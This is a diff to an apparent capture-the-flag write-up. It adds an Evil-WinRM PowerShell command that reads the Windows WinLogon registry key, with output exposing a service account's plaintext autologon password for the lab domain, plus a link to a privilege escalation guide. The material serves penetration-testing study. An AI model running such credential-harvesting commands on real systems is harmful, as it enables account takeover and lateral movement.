@@ -129,13 +129,23 @@ Mode                LastWriteTime         Length Name
 ----                -------------         ------ ----                                                                                                                                                                                                    
 -a----        1/23/2020  10:03 AM             34 user.txt  
 ```
+```markdown
 
+*Evil-WinRM* PS C:\Users\FSmith\Documents> Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon' | select "Default*"
+
+DefaultDomainName DefaultUserName                 DefaultPassword           
+----------------- ---------------                 ---------------           
+EGOTISTICALBANK   EGOTISTICALBANK\svc_loanmanager Moneymakestheworldgoround!
+
+```
 
 
 
 
 ## Resources:
-[https://www.dotnetperls.com/console-vbnet](https://www.dotnetperls.com/console-vbnet)
+
+
+[https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
 
 
 
